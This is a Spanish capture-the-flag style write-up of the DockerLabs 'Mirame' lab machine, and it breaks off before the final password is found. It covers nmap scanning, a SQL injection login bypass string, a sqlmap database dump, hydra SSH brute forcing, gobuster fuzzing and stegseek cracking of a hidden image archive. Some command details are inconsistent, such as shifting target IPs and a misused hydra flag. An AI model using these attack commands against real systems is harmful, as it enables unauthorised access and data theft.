# 🧠 **Informe de Pentesting – Máquina: Mirame**

### 💡 **Dificultad:** Fácil

### 🧩 **Plataforma:** DockerLabs

---
![Despliegue](Imagenes/logo.png)

---

# ⚙️ **Despliegue de la máquina**

Se descarga el archivo comprimido de la máquina vulnerable y se despliega el contenedor Docker utilizando el script proporcionado por el laboratorio:

```bash
unzip backend.zip
sudo bash auto_deploy.sh mirame.tar
```
![Despliegue](Imagenes/despliegue.png)

Primero se comprueba si se tiene conexiòn con el objetivo

```bash
ping -c4 172.17.0.3
```
![Despliegue](Imagenes/ping.png)

Se comprueba los puertos que estan activos en este caso los puertos identificados son:

22 ssh
80 http

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3
```

A continuacion verificamos los servicios y las verciones que esta corriendo y verificar si existe alguna mala practica o vulnerabilidad

```bash
sudo nmap -sCV -p22,80 172.17.0.3
```
![Despliegue](Imagenes/namp.png)

Sabemos que el pueto 80 esta abierto entonces entramos a ver la pagina que esta corriendo ya que el puerto 80 esta corriendo un servico http

![Despliegue](Imagenes/pagina.png)

Nos muestra una pagina login pruebo credenciales por defecto y no tengo acceso
pero pruebo una inyecciòn basica msql y logro obtener acceso

```bash
admin' OR '1'='1' -- -
```
![Despliegue](Imagenes/inyecciòn.png)

Tambien al poner una simple ' nos da un error que nos muestra que el formulario es vulnerable a inyeccòn msql
Con burtsuit intercepto la peticòn del formulario cuando mando la informaciòn y lo guardo en un .req yo lo nombre (petici.req) para usarlo con la herramienta sqlmap 
Recordar que esta herramienta en algunos caso no esta permito en algunas cetificaiònes

```bash
sqlmap -r petici.req --level=5 --risk=3 --dump 
```

![Despliegue](Imagenes/inyecciònuno.png)

![Despliegue](Imagenes/inyecciondos.png)

![Despliegue](Imagenes/inyecciontres.png)

Al terminar nos muestra una tabla con usuarios y contraseña

Se realizo un fuzzin pero no se encontro algun vector de ataque 

![Despliegue](Imagenes/gobuster.png)

Puse los uaurios y contraseñas en dos .txt para usarlo con hydra y ver si es correcto alguna credencial para acceder al SSH ya que lo vimos abierto su puerto 
Pero no se tuvo exito

```bash
hydra -L user.txt -p password.txt ssh://172.17.0.2    
```

Use ahora el .txt para realizar fuzzing y ecnotre una doreccion con exito

```bash
gobuster dir -u http://172.17.0.2/ -w password.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 329
```
![Despliegue](Imagenes/gobustersecreto.png)

Al entrar y examinar se encuntre una imagen

```bash
http://172.17.0.2/directoriotravieso/
```
Para poder examinar descargamos la imagen con

```bash
wget http://172.17.0.2/directoriotravieso/miramebien.jpg
```
![Despliegue](Imagenes/descargaimagen.png)


Este es el historial y el proceso exacto que se seguido  para resolver esta fase:

### 1. Análisis Inicial de Metadatos

Se empezo inspeccionando la imagen para ver si el creador del reto había dejado alguna pista o contraseña en los metadatos estándar del archivo:

```bash
exiftool miramebien.jpg
```

* **Resultado:** El archivo no tenía comentarios ni metadatos extraños útiles, pero confirmaste que era un JPEG real de 6.3 kB, lo que sugería esteganografía pura debido al nombre del archivo.

---

### 2. Ataque de Fuerza Bruta Esteganográfica

Como `steghide` te pedía un salvoconducto (contraseña) para extraer la información, utilizaste **Stegseek**, la herramienta más rápida para romper la seguridad de `steghide` usando el diccionario `rockyou.txt`:

```bash
stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt

```
![Despliegue](Imagenes/fotopasouno.png)


* **Resultado:** ¡Éxito rotundo! `stegseek` descubrió que la contraseña de la imagen era **`chocolate`** y te indicó que dentro de la imagen venía oculto un archivo llamado `ocultito.zip`.

---

### 3. Extracción del Contenido Oculto

Una vez que supiste la contraseña correcta gracias a la fuerza bruta, utilizaste `steghide` para extraer formalmente el archivo protegido:

```bash
steghide extract -sf miramebien.jpg

```

* **Resultado:** Introdujiste la contraseña `chocolate` y el sistema te confirmó la extracción generando el archivo comprimido: `anotó los datos extraídos e/"ocultito.zip"`.

---

### 4. Inspección del Directorio y Estado Actual

Finalmente, listaste los archivos para verificar qué habías obtenido y tratar de descomprimirlo:

```bash
ls -la
unzip ocultito.zip

```

* **Resultado:** Se confirma la creación de `ocultito.zip` (y su clon `miramebien.jpg.out`). Al intentar descomprimirlo, descubriste que el archivo `secret.txt` que lleva dentro requiere **otra contraseña diferente**.
